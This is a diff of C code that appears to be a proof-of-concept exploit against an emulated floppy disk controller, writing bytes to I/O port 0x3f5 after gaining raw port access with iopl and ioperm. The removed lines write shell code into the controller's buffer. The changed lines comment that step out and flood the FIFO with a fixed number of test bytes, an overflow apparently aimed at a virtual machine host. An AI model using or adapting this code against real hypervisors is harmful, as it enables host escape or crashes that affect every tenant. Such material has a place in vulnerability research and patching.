@@ -3,7 +3,7 @@
 #define FIFO 0x3f5
 #define RDID 0x0a
 #define SPC_COMMAND 0x8e
-#define BH_COUNT 0x4b00
+#define BH_COUNT 0x100
 #define SH_POSITION 0x1ff
 #define SH_COUNT 7
 #define TEST_VAL  0x11
@@ -26,18 +26,18 @@ int main(void){
         iopl(3);
         ioperm(FIFO, 1, 1);
         outb(SPC_COMMAND, FIFO);
-        int i,j;
-        j = BH_COUNT-SH_POSITION-len_of_command-NUM_STRUCT*STRUCT_LEN;
-        //find a position to write shell code
-        for(i=0; i<SH_POSITION; i++ ){
-            outb(TEST_VAL,0x3f5);
-        }
-        //write shell code
-        for(i=0;i<SH_COUNT; i++){
-            outb(code[i], FIFO);
-        }
+        // int i,j;
+        // j = BH_COUNT-SH_POSITION-len_of_command-NUM_STRUCT*STRUCT_LEN;
+        // //find a position to write shell code
+        // for(i=0; i<SH_POSITION; i++ ){
+        //     outb(TEST_VAL,0x3f5);
+        // }
+        // //write shell code
+        // for(i=0;i<SH_COUNT; i++){
+        //     outb(code[i], FIFO);
+        // }
         // go to bh struct
-        for(i=0; i<j; i++){
+        for(i=0; i<BH_COUNT; i++){
             outb(TEST_VAL, FIFO);
         }
         
